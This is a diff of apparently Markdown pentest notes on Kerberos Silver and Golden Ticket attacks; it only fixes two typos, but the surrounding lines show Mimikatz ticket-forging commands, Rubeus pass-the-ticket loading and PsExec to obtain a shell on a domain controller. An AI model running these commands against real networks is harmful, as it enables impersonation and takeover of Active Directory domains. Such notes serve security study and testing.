@@ -108,7 +108,7 @@ If a lowercase letter “l” appears in the group’s execute field, means that
 * creating the ticket with Mimikatz:
 * `kerberos::golden /sid:<SID (remove last 4 digits after dash)> /domain:<Domain FQDN> /user:<user to impersonate (need user's hash too at the end)> /service:<service we are trying to connect to, in our example is HTTP> /target:<The target server (workstation-02.krbtown.local)> /rc4:<the password hash of the service account in our case Administrator>`
 * Mimikatz will save the output as ticket.kirbi
-* using Rubeus to lead the ticket into our current session:
+* using Rubeus to load the ticket into our current session:
 * `Rubeus.exe ptt /ticket:ticket.kirbi`
 * now we can connect to the iis_service from this session
 * **Golden Ticket attack**
@@ -121,7 +121,7 @@ If a lowercase letter “l” appears in the group’s execute field, means that
 * `systeminfo | findstr /B /C:"Domain"`
 * The KRBTGT's password hash can only be dumped after becoming domain administrator and either performing a password dump on the DC, a DYNSync attack or a shadow copy on the DC. The user to impersonate can be any user of the domain even a non existing one with administrator RID.
 * `kerberos::golden /sid:<Domain SID> /domain:<Domain FQDN> /user:<The user to impersonate> /krbtgt:<The password hash of the KRBTGT account>`
-* load the kreated ticket into memory and then use psexec to get a shell on the target machine
+* load the created ticket into memory and then use psexec to get a shell on the target machine
 * `Rubeus.exe ptt /ticket:ticket.kirbi`
 * `PsExec.exe \\dc01.krbtown.local cmd`
 
